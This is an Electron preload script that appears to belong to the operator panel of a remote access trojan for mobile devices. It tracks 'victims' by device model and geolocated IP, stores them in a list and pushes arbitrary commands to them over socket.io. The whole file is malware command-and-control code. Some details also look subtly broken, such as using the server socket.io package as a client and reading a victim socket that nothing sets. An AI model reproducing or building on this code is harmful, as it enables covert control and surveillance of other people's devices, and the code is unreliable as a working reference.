## Preload.js
```js
const { contextBridge, ipcRenderer } = require('electron');

const io = require('socket.io');

const geoip = require('geoip-lite');

const victimsList = require('./app/assets/js/model/Victim');

contextBridge.exposeInMainWorld('electron', {

  connectToServer: (port) => {

    const socket = io(`http://localhost:${port}`);

    socket.on('connect', () => {

      ipcRenderer.send('SocketIO:Connected');

    });

    socket.on('disconnect', () => {

      ipcRenderer.send('SocketIO:Disconnected');

    });

    socket.on('new-victim', (victim) => {

      const { id, ip, port, manf, model, release } = victim;

      const address = socket.io.engine.transport.socket._socket.address();

      const remoteIp = address.address;

      const remotePort = address.port;

      const geo = geoip.lookup(remoteIp);

      const country = geo ? geo.country.toLowerCase() : null;

      victimsList.addVictim(id, ip, port, country, manf, model, release, remoteIp, remotePort);

      ipcRenderer.send('SocketIO:NewVictim', victim);

    });

    return socket;

  },

  getVictims: () => {

    return victimsList.getVictims();

  },

  deleteVictim: (id) => {

    victimsList.deleteVictim(id);

  },

  sendCommand: (id, command) => {

    const victim = victimsList.getVictim(id);

    victim.socket.emit('command', command);

  },

  getCommands: (id) => {

    const victim = victimsList.getVictim(id);

    return victim.commands;

  },

  deleteCommand: (id, index) => {

    const victim = victimsList.getVictim(id);

    victim.commands.splice(index, 1);

  },

  disconnect: (socket) => {

    socket.disconnect();

  },

});



```
